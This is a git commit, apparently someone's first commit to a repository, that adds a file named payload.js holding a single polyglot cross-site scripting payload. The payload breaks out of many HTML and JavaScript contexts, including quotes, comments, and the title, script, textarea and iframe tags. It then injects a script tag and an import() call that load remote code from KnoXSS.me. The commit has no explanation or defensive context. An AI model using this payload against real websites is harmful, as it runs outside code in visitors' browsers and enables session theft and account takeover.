181ea935c2bc24bf0c5560f642d4048cb0c25293
krip78 <ujwal3213@gmail.com>
2023-10-07 03:06:06 -0600

    first commit

---
+++ payload.js
@@ -0,0 +1,2 @@
+JavaScript://%250A0?1:import(/https:KnoXSS.me\00?1=17054/.source)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(d=document,d.body.appendChild(d.createElement(/script/.source)).src=/https:KnoXSS.me\00?1=17054/.source)}//\76-->
+
